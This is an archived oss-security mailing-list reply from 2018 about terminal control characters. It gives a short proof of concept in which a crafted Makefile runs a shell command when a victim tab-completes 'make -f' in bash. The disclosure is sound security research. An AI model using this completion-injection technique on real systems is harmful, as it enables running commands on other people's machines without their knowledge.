X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1329" "Monday" "16" "April" "2018" "10:15:00" "+0200" "Jakub Wilk" "jwilk@jwilk.net" "<20180416081500.4dnup7bk3g6vkkaa@jwilk.net>" "37" "Re: [oss-security] Re: Terminal Control Chars" nil nil nil "4" "2018041608:15:00" "[oss-security] Re: Terminal Control Chars" (number mark "U       jwilk@jwilk. Apr 16   37/1329  " thread-indent "\"Re: [oss-security] Re: Terminal Control Chars\"\n") "<E1f6jcD-0002pc-T3@rmmprod07.runbox>" ("<20180412180720.qmtilbpi27kxa3dm@matica.foolinux.mooo.com>" "<E1f6jcD-0002pc-T3@rmmprod07.runbox>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 7233 invoked by uid 550); 16 Apr 2018 08:15:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7208 invoked from network); 16 Apr 2018 08:15:16 -0000
Date: Mon, 16 Apr 2018 10:15:00 +0200
From: Jakub Wilk <jwilk@jwilk.net>
To: oss-security@lists.openwall.com
Message-ID: <20180416081500.4dnup7bk3g6vkkaa@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
References: <20180412180720.qmtilbpi27kxa3dm@matica.foolinux.mooo.com>
 <E1f6jcD-0002pc-T3@rmmprod07.runbox>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Disposition: inline
In-Reply-To: <E1f6jcD-0002pc-T3@rmmprod07.runbox>
User-Agent: NeoMutt/20180323
X-Ovh-Tracer-Id: 6595521654383761318
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgedtgedrieejgddufedtucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecufedttdenuc
Subject: Re: [oss-security] Re: Terminal Control Chars

* David A. Wheeler <dwheeler@dwheeler.com>, 2018-04-12, 17:18:
>Russ Allbery:
>>I think a useful definition of "control character" in this context 
>>(and I realize this doesn't exactly match the ASCII definition) is a 
>>character that results in an action other than insertion being 
>>taken... CR and LF would not be control characters in that definition, 
>>since they insert a newline and don't cause an action. Similarly, TAB 
>>wouldn't be a control character in that definition.
>
>As you noted, that definition doesn't match the ASCII definition, but I 
>also think it's misleading.  If someone pastes a CR/LF into a shell 
>prompt, it certainly *DOES* cause an action,

Similarly, tab is an "active" character in most shells.

In the worst case (the victim uses bash with bash-completion installed, 
and the attacker has write access to the victim's filesystem), pasting 
tab can be as bad as pasting LF.

Here's a proof of concept:

   $ printf 'x := $(shell (echo; cowsay pwned)>/dev/tty)' > moo
   $ make -f moo <tab>
    _______
   < pwned >
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

Credit for discovering this goes to Dan Rosenberg:
https://twitter.com/djrbliss/status/699363006946344963

-- 
Jakub Wilk
